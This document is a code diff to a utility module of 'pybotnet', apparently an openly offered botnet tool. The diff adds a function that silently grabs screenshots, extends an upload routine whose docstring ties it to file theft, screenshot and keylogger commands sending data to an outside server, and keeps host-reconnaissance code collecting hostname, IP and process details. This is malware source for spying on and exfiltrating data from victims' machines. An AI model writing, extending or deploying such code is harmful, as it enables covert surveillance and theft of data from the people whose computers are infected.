@@ -9,11 +9,12 @@ import json
 import platform
 import time
 import zipfile
+import os
 
-from os import getcwd, getpid, path, remove
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
+from PIL import ImageGrab
 
 
 def get_current_epoc_time() -> float:
@@ -82,8 +83,8 @@ def get_full_system_info(pybotnet_uptime=None) -> str:
     full_system_info = f"""{get_short_system_info()}
 pybotnet up time: {pybotnet_uptime} Seconds
 local ip: {get_host_name_ip()}
-current route: {getcwd()}
-pid: {getpid()}
+current route: {os.getcwd()}
+pid: {os.getpid()}
 pybotnet version: {settings.pybotnet_version}
 -----------------------"""
 
@@ -276,28 +277,28 @@ def make_zip_file(route, logger, delete_input_file=False):
     '''
 
     # input: /home/onion/text.py ooutput: text.zip
-    new_file_name = path.splitext(path.basename(route))[0]
+    new_file_name = os.path.splitext(os.path.basename(route))[0]
     new_file_name = f'{new_file_name}.zip'
 
-    if not path.isfile(route):
+    if not os.path.isfile(route):
         logger.error('make_zip_file: is not a file')
-        return False, 'None'
+        return False, 'make_zip_file: is not a file'
 
     try:
         with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-            zf.write(route, path.basename(route))
+            zf.write(route, os.path.basename(route))
 
         logger.info(
             f'make_zip_file: The file was successfully zipped, file name {new_file_name}')
 
         if delete_input_file:
-            remove(route)
+            os.remove(route)
 
         return True, new_file_name
 
     except Exception as error:
         logger.error(f'make_zip_file: {error}')
-        return False, error
+        return False, str(error)
 
 
 def conver_json_to_dict(json_data: json) -> dict:
@@ -305,8 +306,8 @@ def conver_json_to_dict(json_data: json) -> dict:
     return json.loads(json_data)
 
 
-def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200):
-    # time_out 1200: 20 min
+def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200, file_type: str = 'zip'):
+    # time_out 1200 s == 20 min
     '''api for upload zip file and return download link \n
     this use in commands: import_file, screen_shut, key_loger,.. \n
     its not safe for file transfer!
@@ -352,7 +353,7 @@ def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200):
         finalise_headers = {
             'fuid': FUID,
             'file_name': file_name,
-            'file_type': 'zip',
+            'file_type': file_type,
             'total_chunks': 1
         }
 
@@ -376,3 +377,21 @@ def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200):
     except Exception as error:
         logger.error(f'upload_server_1.extract download link error: {error}')
         return False, 'None'
+
+
+def screenshot_pil(logger, route: str = ''):
+    '''get a sreenshot and save to file , return file name or False'''
+    try:
+        file_name = str(get_current_epoc_time()).replace('.', '_')
+        file = open(f'{route}{file_name}.png', 'wb')
+
+        screenshot = ImageGrab.grab()
+        # Save the image to the file object as a PNG
+        screenshot.save(file, 'PNG')
+
+        file.close()
+        return f'{file_name}.png'
+
+    except Exception as error:
+        logger.info(f'util.screenshot_pil error: {error}')
+        return False
